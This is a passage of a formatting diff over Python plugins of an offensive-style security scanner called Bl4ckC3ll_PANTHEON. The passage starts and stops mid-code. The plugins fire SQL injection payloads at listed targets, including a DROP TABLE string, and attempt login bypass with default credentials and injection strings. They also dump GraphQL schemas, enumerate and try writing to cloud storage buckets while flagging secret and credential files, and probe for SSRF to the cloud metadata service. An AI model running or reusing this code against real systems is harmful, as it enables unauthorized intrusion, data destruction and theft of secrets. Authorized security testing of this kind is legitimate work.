[],\n         \"parameter_pollution\": [],\n         \"mass_assignment\": [],\n-        \"timestamp\": time.time()\n+        \"timestamp\": time.time(),\n     }\n-    \n-    base_url = target.rstrip('/')\n-    \n+\n+    base_url = target.rstrip(\"/\")\n+\n     # Test for SQL injection in API endpoints\n     sql_payloads = [\n         \"' OR '1'='1\",\n         \"' UNION SELECT null--\",\n         \"'; DROP TABLE users--\",\n         \"1' AND 1=1--\",\n-        \"admin'/*\"\n+        \"admin'/*\",\n     ]\n-    \n+\n     api_endpoints = [\"/api/users\", \"/api/login\", \"/api/search\"]\n-    \n+\n     for endpoint in api_endpoints:\n         test_url = urljoin(base_url, endpoint)\n-        \n+\n         # Test SQL injection\n         for payload in sql_payloads:\n             try:\n                 # Test in query parameters\n                 cmd = [\"curl\", \"-s\", \"--max-time\", \"10\", f\"{test_url}?id={payload}\"]\n                 result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)\n-                \n+\n                 if result.returncode == 0 and result.stdout:\n                     content = result.stdout.lower()\n-                    if any(error in content for error in ['sql', 'mysql', 'postgres', 'oracle', 'error']):\n-                        results[\"injection_tests\"].append({\n-                            \"endpoint\": endpoint,\n-                            \"payload\": payload,\n-                            \"method\": \"GET\",\n-                            \"vulnerability\": \"potential_sql_injection\",\n-                            \"evidence\": result.stdout[:200]\n-                        })\n+                    if any(\n+                        error in content\n+                        for error in [\"sql\", \"mysql\", \"postgres\", \"oracle\", \"error\"]\n+                    ):\n+                        results[\"injection_tests\"].append(\n+                            {\n+                                \"endpoint\": endpoint,\n+                                \"payload\": payload,\n+                                \"method\": \"GET\",\n+                                \"vulnerability\": \"potential_sql_injection\",\n+                                \"evidence\": result.stdout[:200],\n+                            }\n+                        )\n             except Exception:\n                 continue\n-        \n+\n         # Test HTTP method tampering\n         methods = [\"GET\", \"POST\", \"PUT\", \"DELETE\", \"PATCH\", \"HEAD\", \"OPTIONS\"]\n         for method in methods:\n             try:\n-                cmd = [\"curl\", \"-s\", \"-X\", method, \"--max-time\", \"10\", \"-w\", \"%{http_code}\", test_url]\n+                cmd = [\n+                    \"curl\",\n+                    \"-s\",\n+                    \"-X\",\n+                    method,\n+                    \"--max-time\",\n+                    \"10\",\n+                    \"-w\",\n+                    \"%{http_code}\",\n+                    test_url,\n+                ]\n                 result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)\n-                \n+\n                 if result.returncode == 0:\n-                    lines = result.stdout.strip().split('\\n')\n+                    lines = result.stdout.strip().split(\"\\n\")\n                     status_code = lines[-1] if lines else \"000\"\n-                    \n-                    results[\"method_tampering\"].append({\n-                        \"endpoint\": endpoint,\n-                        \"method\": method,\n-                        \"status_code\": status_code,\n-                        \"allowed\": not status_code.startswith('405')\n-                    })\n+\n+                    results[\"method_tampering\"].append(\n+                        {\n+                            \"endpoint\": endpoint,\n+                            \"method\": method,\n+                            \"status_code\": status_code,\n+                            \"allowed\": not status_code.startswith(\"405\"),\n+                        }\n+                    )\n             except Exception:\n                 continue\n-    \n+\n     return results\n+\n \n def test_graphql_security(target: str) -> Dict[str, Any]:\n     \"\"\"Test GraphQL specific security vulnerabilities\"\"\"\n     results = {\n         \"introspection_enabled\": False,\n         \"depth_limit_test\": {},\n         \"query_complexity\": {},\n         \"field_suggestions\": [],\n-        \"timestamp\": time.time()\n+        \"timestamp\": time.time(),\n     }\n-    \n-    base_url = target.rstrip('/')\n+\n+    base_url = target.rstrip(\"/\")\n     graphql_endpoints = [\"/graphql\", \"/api/graphql\", \"/v1/graphql\", \"/query\"]\n-    \n+\n     for endpoint in graphql_endpoints:\n         test_url = urljoin(base_url, endpoint)\n-        \n+\n         # Test introspection\n-        introspection_query = {\n-            \"query\": \"{ __schema { queryType { name } } }\"\n-        }\n-        \n+        introspection_query = {\"query\": \"{ __schema { queryType { name } } }\"}\n+\n         try:\n             cmd = [\n-                \"curl\", \"-s\", \"-X\", \"POST\",\n-                \"-H\", \"Content-Type: application/json\",\n-                \"-d\", json.dumps(introspection_query),\n-                \"--max-time\", \"10\", test_url\n+                \"curl\",\n+                \"-s\",\n+                \"-X\",\n+                \"POST\",\n+                \"-H\",\n+                \"Content-Type: application/json\",\n+                \"-d\",\n+                json.dumps(introspection_query),\n+                \"--max-time\",\n+                \"10\",\n+                test_url,\n             ]\n-            \n+\n             result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)\n-            \n+\n             if result.returncode == 0 and result.stdout:\n                 try:\n                     response = json.loads(result.stdout)\n                     if \"data\" in response and \"__schema\" in str(response):\n                         results[\"introspection_enabled\"] = True\n                         results[\"introspection_endpoint\"] = endpoint\n-                        \n+\n                         # Get full schema if introspection is enabled\n                         full_schema_query = {\n                             \"query\": \"{ __schema { types { name fields { name type { name } } } } }\"\n                         }\n-                        \n+\n                         schema_cmd = [\n-                            \"curl\", \"-s\", \"-X\", \"POST\",\n-                            \"-H\", \"Content-Type: application/json\", \n-                            \"-d\", json.dumps(full_schema_query),\n-                            \"--max-time\", \"15\", test_url\n+                            \"curl\",\n+                            \"-s\",\n+                            \"-X\",\n+                            \"POST\",\n+                            \"-H\",\n+                            \"Content-Type: application/json\",\n+                            \"-d\",\n+                            json.dumps(full_schema_query),\n+                            \"--max-time\",\n+                            \"15\",\n+                            test_url,\n                         ]\n-                        \n-                        schema_result = subprocess.run(schema_cmd, capture_output=True, text=True, timeout=20)\n-                        \n+\n+                        schema_result = subprocess.run(\n+                            schema_cmd, capture_output=True, text=True, timeout=20\n+                        )\n+\n                         if schema_result.returncode == 0:\n                             try:\n                                 schema_response = json.loads(schema_result.stdout)\n                                 if \"data\" in schema_response:\n                                     results[\"schema_dump\"] = schema_response\n                             except Exception as e:\n                                 logging.warning(f\"Unexpected error: {e}\")\n                                 # Consider if this error should be handled differently\n                 except json.JSONDecodeError:\n                     pass\n-        \n+\n         except Exception:\n             continue\n-        \n+\n         # Test depth limit (DoS protection)\n         deep_query = {\n             \"query\": \"{ user { posts { comments { replies { replies { replies { id } } } } } } }\"\n         }\n-        \n+\n         try:\n             cmd = [\n-                \"curl\", \"-s\", \"-X\", \"POST\",\n-                \"-H\", \"Content-Type: application/json\",\n-                \"-d\", json.dumps(deep_query),\n-                \"--max-time\", \"10\", test_url\n+                \"curl\",\n+                \"-s\",\n+                \"-X\",\n+                \"POST\",\n+                \"-H\",\n+                \"Content-Type: application/json\",\n+                \"-d\",\n+                json.dumps(deep_query),\n+                \"--max-time\",\n+                \"10\",\n+                test_url,\n             ]\n-            \n+\n             result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)\n-            \n+\n             if result.returncode == 0:\n                 if \"depth\" in result.stdout.lower() or \"limit\" in result.stdout.lower():\n                     results[\"depth_limit_test\"][\"protected\"] = True\n                 else:\n                     results[\"depth_limit_test\"][\"protected\"] = False\n                     results[\"depth_limit_test\"][\"response\"] = result.stdout[:500]\n-        \n+\n         except Exception:\n             continue\n-    \n+\n     return results\n+\n \n def test_authentication_security(target: str) -> Dict[str, Any]:\n     \"\"\"Test authentication and authorization mechanisms\"\"\"\n     results = {\n         \"jwt_vulnerabilities\": [],\n         \"session_management\": {},\n         \"oauth_tests\": {},\n         \"bypass_attempts\": [],\n-        \"timestamp\": time.time()\n+        \"timestamp\": time.time(),\n     }\n-    \n-    base_url = target.rstrip('/')\n+\n+    base_url = target.rstrip(\"/\")\n     auth_endpoints = [\"/login\", \"/auth\", \"/api/login\", \"/api/auth\", \"/oauth\"]\n-    \n+\n     # Test for common authentication bypasses\n     bypass_payloads = [\n         {\"username\": \"admin\", \"password\": \"admin\"},\n         {\"username\": \"admin\", \"password\": \"password\"},\n         {\"username\": \"' OR '1'='1\", \"password\": \"anything\"},\n         {\"username\": \"admin'--\", \"password\": \"\"},\n-        {\"username\": \"admin\", \"password\": \"' OR '1'='1\"}\n+        {\"username\": \"admin\", \"password\": \"' OR '1'='1\"},\n     ]\n-    \n+\n     for endpoint in auth_endpoints:\n         test_url = urljoin(base_url, endpoint)\n-        \n+\n         for payload in bypass_payloads:\n             try:\n                 # Test with POST data\n                 post_data = json.dumps(payload)\n                 cmd = [\n-                    \"curl\", \"-s\", \"-X\", \"POST\",\n-                    \"-H\", \"Content-Type: application/json\",\n-                    \"-d\", post_data,\n-                    \"--max-time\", \"10\", test_url\n+                    \"curl\",\n+                    \"-s\",\n+                    \"-X\",\n+                    \"POST\",\n+                    \"-H\",\n+                    \"Content-Type: application/json\",\n+                    \"-d\",\n+                    post_data,\n+                    \"--max-time\",\n+                    \"10\",\n+                    test_url,\n                 ]\n-                \n+\n                 result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)\n-                \n+\n                 if result.returncode == 0:\n                     content = result.stdout.lower()\n-                    \n+\n                     # Check for successful login indicators\n-                    success_indicators = ['token', 'success', 'welcome', 'dashboard', 'jwt']\n+                    success_indicators = [\n+                        \"token\",\n+                        \"success\",\n+                        \"welcome\",\n+                        \"dashboard\",\n+                        \"jwt\",\n+                    ]\n                     if any(indicator in content for indicator in success_indicators):\n-                        results[\"bypass_attempts\"].append({\n-                            \"endpoint\": endpoint,\n-                            \"payload\": payload,\n-                            \"response\": result.stdout[:300],\n-                            \"potential_bypass\": True\n-                        })\n-            \n+                        results[\"bypass_attempts\"].append(\n+                            {\n+                                \"endpoint\": endpoint,\n+                                \"payload\": payload,\n+                                \"response\": result.stdout[:300],\n+                                \"potential_bypass\": True,\n+                            }\n+                        )\n+\n             except Exception:\n                 continue\n-    \n+\n     # Test JWT token handling\n     # Look for JWT tokens in responses\n     try:\n         cmd = [\"curl\", \"-s\", \"--max-time\", \"10\", base_url]\n         result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)\n-        \n+\n         if result.returncode == 0:\n             # Search for JWT pattern\n-            jwt_pattern = r'[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+'\n+            jwt_pattern = r\"[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\"\n             jwt_matches = re.findall(jwt_pattern, result.stdout)\n-            \n+\n             for jwt_token in jwt_matches:\n                 if len(jwt_token) > 20:  # Basic JWT length check\n-                    results[\"jwt_vulnerabilities\"].append({\n-                        \"token\": jwt_token[:50] + \"...\",  # Truncate for safety\n-                        \"location\": \"response_body\",\n-                        \"tests\": [\"none_algorithm\", \"weak_secret\", \"key_confusion\"]\n-                    })\n-    \n+                    results[\"jwt_vulnerabilities\"].append(\n+                        {\n+                            \"token\": jwt_token[:50] + \"...\",  # Truncate for safety\n+                            \"location\": \"response_body\",\n+                            \"tests\": [\"none_algorithm\", \"weak_secret\", \"key_confusion\"],\n+                        }\n+                    )\n+\n     except Exception as e:\n-            logging.warning(f\"Operation failed: {e}\")\n-            # Consider if this error should be handled differently\n+        logging.warning(f\"Operation failed: {e}\")\n+        # Consider if this error should be handled differently\n     return results\n+\n \n def test_rate_limiting(target: str) -> Dict[str, Any]:\n     \"\"\"Test rate limiting and DoS protection\"\"\"\n     results = {\n         \"rate_limit_status\": {},\n         \"dos_protection\": {},\n         \"concurrent_requests\": {},\n-        \"timestamp\": time.time()\n+        \"timestamp\": time.time(),\n     }\n-    \n-    base_url = target.rstrip('/')\n+\n+    base_url = target.rstrip(\"/\")\n     test_endpoints = [\"/api\", \"/login\", \"/api/login\"]\n-    \n+\n     for endpoint in test_endpoints:\n         test_url = urljoin(base_url, endpoint)\n-        \n+\n         # Test rapid sequential requests\n         try:\n             response_codes = []\n             response_times = []\n-            \n+\n             for i in range(10):  # Limited to avoid being too aggressive\n                 start_time = time.time()\n-                \n-                cmd = [\"curl\", \"-s\", \"-w\", \"%{http_code}:%{time_total}\", \"--max-time\", \"5\", test_url]\n+\n+                cmd = [\n+                    \"curl\",\n+                    \"-s\",\n+                    \"-w\",\n+                    \"%{http_code}:%{time_total}\",\n+                    \"--max-time\",\n+                    \"5\",\n+                    test_url,\n+                ]\n                 result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)\n-                \n+\n                 end_time = time.time()\n-                \n+\n                 if result.returncode == 0:\n-                    output = result.stdout.strip().split('\\n')[-1]\n-                    if ':' in output:\n-                        status_code, response_time = output.split(':', 1)\n+                    output = result.stdout.strip().split(\"\\n\")[-1]\n+                    if \":\" in output:\n+                        status_code, response_time = output.split(\":\", 1)\n                         response_codes.append(status_code)\n                         response_times.append(float(response_time))\n-                \n+\n                 time.sleep(0.1)  # Small delay between requests\n-            \n+\n             # Analyze results\n             if response_codes:\n-                rate_limited = any(code in ['429', '503', '502'] for code in response_codes)\n-                \n+                rate_limited = any(\n+                    code in [\"429\", \"503\", \"502\"] for code in response_codes\n+                )\n+\n                 results[\"rate_limit_status\"][endpoint] = {\n                     \"rate_limited\": rate_limited,\n                     \"response_codes\": response_codes,\n-                    \"avg_response_time\": sum(response_times) / len(response_times) if response_times else 0,\n-                    \"total_requests\": len(response_codes)\n+                    \"avg_response_time\": (\n+                        sum(response_times) / len(response_times)\n+                        if response_times\n+                        else 0\n+                    ),\n+                    \"total_requests\": len(response_codes),\n                 }\n-        \n+\n         except Exception as e:\n             results[\"rate_limit_status\"][endpoint] = {\"error\": str(e)}\n-    \n-    return results\n\\ No newline at end of file\n+\n+    return results\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/plugins/cloud_security_scanner.py\t2025-09-14 19:10:58.579755+00:00\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/plugins/cloud_security_scanner.py\t2025-09-14 19:23:12.778673+00:00\n@@ -10,118 +10,120 @@\n \n plugin_info = {\n     \"name\": \"Cloud Security Scanner\",\n     \"description\": \"Multi-cloud security assessment including storage buckets, metadata, and misconfigurations\",\n     \"version\": \"1.0.0\",\n-    \"author\": \"@cxb3rf1lth\", \n+    \"author\": \"@cxb3rf1lth\",\n     \"category\": \"cloud_security\",\n     \"requires_internet\": True,\n-    \"risk_level\": \"medium\"\n+    \"risk_level\": \"medium\",\n }\n+\n \n def execute(run_dir: Path, env: Dict[str, str], cfg: Dict[str, Any]):\n     \"\"\"Execute comprehensive cloud security scanning\"\"\"\n     cloud_dir = run_dir / \"cloud_security\"\n     cloud_dir.mkdir(exist_ok=True)\n-    \n+\n     # Read targets\n     targets_file = Path(__file__).parent.parent / \"targets.txt\"\n     if not targets_file.exists():\n         print(\"[CLOUD] No targets file found\")\n         return\n-    \n+\n     targets = []\n-    with open(targets_file, 'r') as f:\n+    with open(targets_file, \"r\") as f:\n         for line in f:\n             target = line.strip()\n-            if target and not target.startswith('#'):\n+            if target and not target.startswith(\"#\"):\n                 targets.append(target)\n-    \n+\n     if not targets:\n         print(\"[CLOUD] No targets found\")\n         return\n-    \n+\n     results = {}\n-    \n+\n     for target in targets:\n         print(f\"[CLOUD] Scanning target: {target}\")\n         target_results = {}\n-        \n+\n         # Extract domain for generating potential cloud resource names\n-        if target.startswith('http'):\n+        if target.startswith(\"http\"):\n             parsed = urlparse(target)\n             domain = parsed.netloc\n         else:\n             domain = target\n-        \n-        base_name = domain.replace('.', '-').replace('_', '-')\n-        \n+\n+        base_name = domain.replace(\".\", \"-\").replace(\"_\", \"-\")\n+\n         # 1. AWS S3 Bucket Discovery and Testing\n         try:\n             s3_results = scan_aws_s3_buckets(base_name, domain)\n             target_results[\"aws_s3\"] = s3_results\n         except Exception as e:\n             print(f\"[CLOUD] AWS S3 scanning error: {e}\")\n-        \n+\n         # 2. Azure Storage Account Testing\n         try:\n             azure_results = scan_azure_storage(base_name, domain)\n             target_results[\"azure_storage\"] = azure_results\n         except Exception as e:\n             print(f\"[CLOUD] Azure storage scanning error: {e}\")\n-        \n+\n         # 3. Google Cloud Storage Testing\n         try:\n             gcs_results = scan_gcp_storage(base_name, domain)\n             target_results[\"gcp_storage\"] = gcs_results\n         except Exception as e:\n             print(f\"[CLOUD] GCP storage scanning error: {e}\")\n-        \n+\n         # 4. Cloud Metadata Service Testing\n         try:\n             metadata_results = test_cloud_metadata(target)\n             target_results[\"cloud_metadata\"] = metadata_results\n         except Exception as e:\n             print(f\"[CLOUD] Metadata service testing error: {e}\")\n-        \n+\n         # 5. Container Registry Discovery\n         try:\n             registry_results = scan_container_registries(base_name)\n             target_results[\"container_registries\"] = registry_results\n         except Exception as e:\n             print(f\"[CLOUD] Container registry scanning error: {e}\")\n-        \n+\n         # 6. Kubernetes/Docker Exposure Detection\n         try:\n             k8s_results = scan_kubernetes_exposure(target)\n             target_results[\"kubernetes_exposure\"] = k8s_results\n         except Exception as e:\n             print(f\"[CLOUD] Kubernetes exposure scanning error: {e}\")\n-        \n+\n         results[target] = target_results\n-    \n+\n     # Save results\n     output_file = cloud_dir / \"cloud_security_results.json\"\n-    with open(output_file, 'w') as f:\n+    with open(output_file, \"w\") as f:\n         json.dump(results, f, indent=2, default=str)\n-    \n+\n     print(f\"[CLOUD] Cloud security results saved to: {output_file}\")\n+\n \n def scan_aws_s3_buckets(base_name: str, domain: str) -> Dict[str, Any]:\n     \"\"\"Scan for AWS S3 bucket misconfigurations\"\"\"\n     results = {\n         \"buckets_tested\": [],\n         \"accessible_buckets\": [],\n         \"bucket_policies\": [],\n-        \"timestamp\": time.time()\n+        \"timestamp\": time.time(),\n     }\n-    \n+\n     # Generate potential bucket names\n     bucket_variations = [\n         base_name,\n         f\"{base_name}-backup\",\n-        f\"{base_name}-backups\", \n+        f\"{base_name}-backups\",\n         f\"{base_name}-data\",\n         f\"{base_name}-files\",\n         f\"{base_name}-images\",\n         f\"{base_name}-assets\",\n         f\"{base_name}-static\",\n@@ -132,442 +134,527 @@\n         f\"{base_name}-test\",\n         f\"{base_name}-staging\",\n         f\"{base_name}-logs\",\n         f\"{base_name}-config\",\n         f\"{base_name}-private\",\n-        f\"{base_name}-public\"\n+        f\"{base_name}-public\",\n     ]\n-    \n+\n     for bucket_name in bucket_variations:\n         try:\n             # Test bucket existence and accessibility\n             s3_urls = [\n                 f\"https://{bucket_name}.s3.amazonaws.com/\",\n                 f\"https://s3.amazonaws.com/{bucket_name}/\",\n                 f\"https://{bucket_name}.s3-us-west-2.amazonaws.com/\",\n-                f\"https://{bucket_name}.s3-eu-west-1.amazonaws.com/\"\n+                f\"https://{bucket_name}.s3-eu-west-1.amazonaws.com/\",\n             ]\n-            \n+\n             for s3_url in s3_urls:\n                 bucket_info = {\n                     \"name\": bucket_name,\n                     \"url\": s3_url,\n                     \"accessible\": False,\n                     \"public_read\": False,\n                     \"public_write\": False,\n-                    \"contents\": []\n+                    \"contents\": [],\n                 }\n-                \n+\n                 # Test bucket accessibility\n                 cmd = [\"curl\", \"-s\", \"-I\", \"--max-time\", \"10\", s3_url]\n                 result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)\n-                \n+\n                 if result.returncode == 0:\n-                    status_line = result.stdout.split('\\n')[0] if result.stdout else \"\"\n-                    \n+                    status_line = result.stdout.split(\"\\n\")[0] if result.stdout else \"\"\n+\n                     if \"200\" in status_line:\n                         bucket_info[\"accessible\"] = True\n                         bucket_info[\"public_read\"] = True\n-                        \n+\n                         # Get bucket contents\n                         content_cmd = [\"curl\", \"-s\", \"--max-time\", \"15\", s3_url]\n-                        content_result = subprocess.run(content_cmd, capture_output=True, text=True, timeout=20)\n-                        \n+                        content_result = subprocess.run(\n+                            content_cmd, capture_output=True, text=True, timeout=20\n+                        )\n+\n                         if content_result.returncode == 0 and content_result.stdout:\n                             # Parse XML response for file listings\n                             content = content_result.stdout\n-                            \n+\n                             # Look for XML keys indicating files\n-                            key_pattern = r'<Key>([^<]+)</Key>'\n+                            key_pattern = r\"<Key>([^<]+)</Key>\"\n                             files = re.findall(key_pattern, content)\n-                            bucket_info[\"contents\"] = files[:20]  # Limit to first 20 files\n-                            \n+                            bucket_info[\"contents\"] = files[\n+                                :20\n+                            ]  # Limit to first 20 files\n+\n                             # Look for sensitive files\n                             sensitive_patterns = [\n-                                'config', 'secret', 'key', 'password', 'credential',\n-                                '.env', 'backup', 'dump', 'database', 'private'\n+                                \"config\",\n+                                \"secret\",\n+                                \"key\",\n+                                \"password\",\n+                                \"credential\",\n+                                \".env\",\n+                                \"backup\",\n+                                \"dump\",\n+                                \"database\",\n+                                \"private\",\n                             ]\n-                            \n+\n                             sensitive_files = []\n                             for file in files:\n-                                if any(pattern in file.lower() for pattern in sensitive_patterns):\n+                                if any(\n+                                    pattern in file.lower()\n+                                    for pattern in sensitive_patterns\n+                                ):\n                                     sensitive_files.append(file)\n-                            \n+\n                             bucket_info[\"sensitive_files\"] = sensitive_files\n-                        \n+\n                         results[\"accessible_buckets\"].append(bucket_info)\n-                    \n+\n                     elif \"403\" in status_line:\n                         bucket_info[\"accessible\"] = False\n                         bucket_info[\"exists\"] = True\n                         bucket_info[\"status\"] = \"exists_but_protected\"\n                         results[\"accessible_buckets\"].append(bucket_info)\n-                \n+\n                 results[\"buckets_tested\"].append(bucket_name)\n-                \n+\n                 # Test write permissions (carefully)\n                 if bucket_info.get(\"accessible\"):\n                     test_write_cmd = [\n-                        \"curl\", \"-s\", \"-X\", \"PUT\", \n-                        \"--max-time\", \"10\",\n+                        \"curl\",\n+                        \"-s\",\n+                        \"-X\",\n+                        \"PUT\",\n+                        \"--max-time\",\n+                        \"10\",\n                         f\"{s3_url}test-write-permission.txt\",\n-                        \"-d\", \"test\"\n+                        \"-d\",\n+                        \"test\",\n                     ]\n-                    \n-                    write_result = subprocess.run(test_write_cmd, capture_output=True, text=True, timeout=15)\n-                    \n-                    if write_result.returncode == 0 and \"200\" in str(write_result.stdout):\n+\n+                    write_result = subprocess.run(\n+                        test_write_cmd, capture_output=True, text=True, timeout=15\n+                    )\n+\n+                    if write_result.returncode == 0 and \"200\" in str(\n+                        write_result.stdout\n+                    ):\n                         bucket_info[\"public_write\"] = True\n-                        \n+\n                         # Clean up test file\n-                        delete_cmd = [\"curl\", \"-s\", \"-X\", \"DELETE\", f\"{s3_url}test-write-permission.txt\"]\n-                        subprocess.run(delete_cmd, capture_output=True, text=True, timeout=10)\n-                \n+                        delete_cmd = [\n+                            \"curl\",\n+                            \"-s\",\n+                            \"-X\",\n+                            \"DELETE\",\n+                            f\"{s3_url}test-write-permission.txt\",\n+                        ]\n+                        subprocess.run(\n+                            delete_cmd, capture_output=True, text=True, timeout=10\n+                        )\n+\n                 break  # Found the bucket, no need to test other URL formats\n-                \n+\n         except Exception as e:\n             continue\n-    \n+\n     return results\n+\n \n def scan_azure_storage(base_name: str, domain: str) -> Dict[str, Any]:\n     \"\"\"Scan for Azure Storage Account misconfigurations\"\"\"\n     results = {\n         \"accounts_tested\": [],\n         \"accessible_accounts\": [],\n-        \"timestamp\": time.time()\n+        \"timestamp\": time.time(),\n     }\n-    \n+\n     # Generate potential storage account names\n     account_variations = [\n-        base_name.replace('-', ''),  # Azure storage accounts don't allow hyphens\n+        base_name.replace(\"-\", \"\"),  # Azure storage accounts don't allow hyphens\n         f\"{base_name.replace('-', '')}data\",\n         f\"{base_name.replace('-', '')}files\",\n         f\"{base_name.replace('-', '')}backup\",\n         f\"{base_name.replace('-', '')}storage\",\n         f\"{base_name.replace('-', '')}dev\",\n-        f\"{base_name.replace('-', '')}prod\"\n+        f\"{base_name.replace('-', '')}prod\",\n     ]\n-    \n+\n     for account_name in account_variations:\n         # Remove any invalid characters\n-        clean_name = re.sub(r'[^a-z0-9]', '', account_name.lower())[:24]  # Max 24 chars\n-        \n+        clean_name = re.sub(r\"[^a-z0-9]\", \"\", account_name.lower())[:24]  # Max 24 chars\n+\n         if len(clean_name) < 3:  # Minimum length requirement\n             continue\n-        \n+\n         try:\n             # Test blob storage\n             blob_url = f\"https://{clean_name}.blob.core.windows.net/\"\n-            \n+\n             account_info = {\n                 \"name\": clean_name,\n                 \"blob_url\": blob_url,\n                 \"accessible\": False,\n-                \"containers\": []\n+                \"containers\": [],\n             }\n-            \n+\n             # Test account accessibility\n             cmd = [\"curl\", \"-s\", \"-I\", \"--max-time\", \"10\", blob_url]\n             result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)\n-            \n+\n             if result.returncode == 0:\n                 if \"200\" in result.stdout or \"400\" in result.stdout:\n                     account_info[\"accessible\"] = True\n-                    \n+\n                     # Test common container names\n-                    container_names = [\"public\", \"files\", \"images\", \"data\", \"backup\", \"logs\"]\n-                    \n+                    container_names = [\n+                        \"public\",\n+                        \"files\",\n+                        \"images\",\n+                        \"data\",\n+                        \"backup\",\n+                        \"logs\",\n+                    ]\n+\n                     for container in container_names:\n                         container_url = f\"{blob_url}{container}/\"\n-                        \n-                        container_cmd = [\"curl\", \"-s\", \"-I\", \"--max-time\", \"10\", container_url]\n-                        container_result = subprocess.run(container_cmd, capture_output=True, text=True, timeout=15)\n-                        \n-                        if container_result.returncode == 0 and \"200\" in container_result.stdout:\n-                            account_info[\"containers\"].append({\n-                                \"name\": container,\n-                                \"url\": container_url,\n-                                \"public\": True\n-                            })\n-                    \n+\n+                        container_cmd = [\n+                            \"curl\",\n+                            \"-s\",\n+                            \"-I\",\n+                            \"--max-time\",\n+                            \"10\",\n+                            container_url,\n+                        ]\n+                        container_result = subprocess.run(\n+                            container_cmd, capture_output=True, text=True, timeout=15\n+                        )\n+\n+                        if (\n+                            container_result.returncode == 0\n+                            and \"200\" in container_result.stdout\n+                        ):\n+                            account_info[\"containers\"].append(\n+                                {\n+                                    \"name\": container,\n+                                    \"url\": container_url,\n+                                    \"public\": True,\n+                                }\n+                            )\n+\n                     results[\"accessible_accounts\"].append(account_info)\n-            \n+\n             results[\"accounts_tested\"].append(clean_name)\n-            \n+\n         except Exception as e:\n             continue\n-    \n+\n     return results\n+\n \n def scan_gcp_storage(base_name: str, domain: str) -> Dict[str, Any]:\n     \"\"\"Scan for Google Cloud Storage misconfigurations\"\"\"\n-    results = {\n-        \"buckets_tested\": [],\n-        \"accessible_buckets\": [],\n-        \"timestamp\": time.time()\n-    }\n-    \n+    results = {\"buckets_tested\": [], \"accessible_buckets\": [], \"timestamp\": time.time()}\n+\n     # Generate potential bucket names\n     bucket_variations = [\n         base_name,\n         f\"{base_name}-backup\",\n         f\"{base_name}-data\",\n         f\"{base_name}-files\",\n         f\"{base_name}-static\",\n         f\"{base_name}-uploads\",\n         f\"{base_name}-dev\",\n         f\"{base_name}-prod\",\n-        f\"{domain.replace('.', '-')}\"\n+        f\"{domain.replace('.', '-')}\",\n     ]\n-    \n+\n     for bucket_name in bucket_variations:\n         try:\n             # Test GCS bucket\n             gcs_urls = [\n                 f\"https://storage.googleapis.com/{bucket_name}/\",\n-                f\"https://{bucket_name}.storage.googleapis.com/\"\n+                f\"https://{bucket_name}.storage.googleapis.com/\",\n             ]\n-            \n+\n             for gcs_url in gcs_urls:\n                 bucket_info = {\n                     \"name\": bucket_name,\n                     \"url\": gcs_url,\n                     \"accessible\": False,\n                     \"public\": False,\n-                    \"objects\": []\n+                    \"objects\": [],\n                 }\n-                \n+\n                 cmd = [\"curl\", \"-s\", \"-I\", \"--max-time\", \"10\", gcs_url]\n                 result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)\n-                \n+\n                 if result.returncode == 0:\n                     if \"200\" in result.stdout:\n                         bucket_info[\"accessible\"] = True\n                         bucket_info[\"public\"] = True\n-                        \n+\n                         # Get bucket contents\n                         content_cmd = [\"curl\", \"-s\", \"--max-time\", \"15\", gcs_url]\n-                        content_result = subprocess.run(content_cmd, capture_output=True, text=True, timeout=20)\n-                        \n+                        content_result = subprocess.run(\n+                            content_cmd, capture_output=True, text=True, timeout=20\n+                        )\n+\n                         if content_result.returncode == 0 and content_result.stdout:\n                             # Parse XML response\n                             content = content_result.stdout\n-                            \n+\n                             # Look for object names\n-                            name_pattern = r'<Name>([^<]+)</Name>'\n+                            name_pattern = r\"<Name>([^<]+)</Name>\"\n                             objects = re.findall(name_pattern, content)\n                             bucket_info[\"objects\"] = objects[:20]\n-                        \n+\n                         results[\"accessible_buckets\"].append(bucket_info)\n-                    \n+\n                     elif \"403\" in result.stdout:\n                         bucket_info[\"accessible\"] = False\n                         bucket_info[\"exists\"] = True\n                         results[\"accessible_buckets\"].append(bucket_info)\n-                \n+\n                 break\n-            \n+\n             results[\"buckets_tested\"].append(bucket_name)\n-            \n+\n         except Exception as e:\n             continue\n-    \n+\n     return results\n+\n \n def test_cloud_metadata(target: str) -> Dict[str, Any]:\n     \"\"\"Test for cloud metadata service exposure\"\"\"\n     results = {\n         \"aws_metadata\": {},\n         \"azure_metadata\": {},\n         \"gcp_metadata\": {},\n-        \"timestamp\": time.time()\n+        \"timestamp\": time.time(),\n     }\n-    \n+\n     # This would typically be tested from within a cloud instance\n     # Here we'll test for SSRF that could lead to metadata access\n-    \n+\n     metadata_urls = [\n         \"http://169.254.169.254/\",  # AWS/Azure metadata\n         \"http://169.254.169.254/latest/meta-data/\",  # AWS\n         \"http://169.254.169.254/metadata/instance/\",  # Azure\n         \"http://metadata.google.internal/\",  # GCP\n-        \"http://metadata/computeMetadata/v1/\"  # GCP\n+        \"http://metadata/computeMetadata/v1/\",  # GCP\n     ]\n-    \n-    base_url = target.rstrip('/')\n-    \n+\n+    base_url = target.rstrip(\"/\")\n+\n     # Test if target might be vulnerable to SSRF leading to metadata access\n     test_endpoints = [\"/proxy\", \"/fetch\", \"/url\", \"/redirect\", \"/image\"]\n-    \n+\n     for endpoint in test_endpoints:\n         test_url = f\"{base_url}{endpoint}\"\n-        \n+\n         for metadata_url in metadata_urls:\n             try:\n                 # Test SSRF to metadata service\n-                cmd = [\"curl\", \"-s\", \"--max-time\", \"10\", f\"{test_url}?url={metadata_url}\"]\n+                cmd = [\n+                    \"curl\",\n+                    \"-s\",\n+                    \"--max-time\",\n+                    